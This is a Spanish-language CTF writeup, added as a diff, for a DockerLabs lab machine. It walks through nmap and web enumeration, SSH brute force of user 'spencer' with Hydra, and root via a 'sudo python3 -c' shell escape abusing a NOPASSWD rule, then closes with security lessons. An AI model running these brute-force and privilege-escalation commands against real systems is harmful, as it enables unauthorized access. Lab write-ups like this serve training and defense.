@@ -1,0 +1,195 @@
+🐛 DockerLabs Writeup 
+📌 Información General
+
+IP objetivo: 172.17.0.2
+
+Objetivo: Obtener acceso root
+
+Servicios expuestos:
+
+22 → SSH
+
+80 → HTTP
+
+Pista: "Encuentra la clave para A en los archivos."
+
+🔎 1. Enumeración Inicial
+🔍 Escaneo con Nmap
+nmap -sC -sV -p- 172.17.0.2
+
+Resultados relevantes:
+22/tcp open  ssh     OpenSSH 9.2p1 Debian
+80/tcp open  http    Apache httpd 2.4.62 (Debian)
+
+
+No se detectaron vulnerabilidades críticas por versión.
+
+🌐 2. Enumeración Web
+WhatWeb
+whatweb http://172.17.0.2
+
+
+Detecta:
+
+Apache 2.4.62
+
+Debian Linux
+
+Nikto
+nikto -h http://172.17.0.2
+
+
+Resultados:
+
+Sin vulnerabilidades explotables
+
+Solo headers faltantes
+
+Análisis Manual
+
+Página HTML estática
+
+Sin formularios
+
+Sin CMS visible
+
+La pista indicaba que la clave estaba en archivos.
+
+🔑 3. Credenciales Iniciales
+
+Se identificaron credenciales con hydra:
+
+Usuario: a
+Password: secret
+
+🔐 4. Acceso Inicial por SSH
+ssh a@172.17.0.2
+
+
+Acceso exitoso.
+
+🔎 5. Enumeración Local
+
+Se revisó el archivo /etc/passwd:
+
+cat /etc/passwd
+
+
+Se encontró otro usuario:
+
+spencer:x:1001:1001::/home/spencer:/bin/bash
+
+💣 6. Fuerza Bruta SSH con Hydra
+
+Se realizó ataque contra SSH para el usuario spencer.
+
+Uso de Hydra
+hydra -l spencer -P wordlist.txt ssh://172.17.0.2
+
+
+Donde:
+
+-l → usuario específico
+
+-P → diccionario de contraseñas
+
+ssh:// → protocolo
+
+Credencial encontrada:
+login: spencer
+password: password1
+
+🔐 7. Acceso como Spencer
+ssh spencer@172.17.0.2
+
+
+Acceso exitoso.
+
+🚀 8. Escalada de Privilegios
+Enumeración con sudo
+sudo -l
+
+
+Salida:
+
+User spencer may run the following commands:
+    (ALL) NOPASSWD: /usr/bin/python3
+
+
+Esto significa que el usuario puede ejecutar python3 como root sin contraseña.
+
+🔥 9. Explotación de sudo mal configurado
+
+Se abusó del permiso NOPASSWD ejecutando una shell desde Python:
+
+sudo python3 -c 'import os; os.system("/bin/bash")'
+
+
+Verificación:
+
+id
+
+
+Resultado:
+
+uid=0(root) gid=0(root)
+
+
+Root obtenido con éxito.
+
+🧠 Vector Completo de Ataque
+
+Enumeración con Nmap
+
+Análisis web
+
+Identificación de credenciales (a:secret)
+
+Acceso SSH inicial
+
+Enumeración local
+
+Descubrimiento del usuario spencer
+
+Fuerza bruta SSH con Hydra
+
+Acceso como spencer
+
+Enumeración de sudo
+
+Abuso de python3 con NOPASSWD
+
+Shell root
+
+🛡 Lecciones de Seguridad
+
+❌ No permitir NOPASSWD en binarios interpretables (python, perl, ruby)
+
+❌ No usar contraseñas débiles
+
+❌ No reutilizar credenciales
+
+✔ Aplicar principio de mínimo privilegio
+
+✔ Configurar sudo de forma restrictiva
+
+🏆 Resultado Final
+
+✔ Acceso inicial
+✔ Movimiento lateral
+✔ Escalada a root
+✔ Máquina comprometida exitosamente
+
+📚 Herramientas Utilizadas
+
+Nmap
+
+WhatWeb
+
+Nikto
+
+Hydra
+
+SSH
+
+Enumeración manual
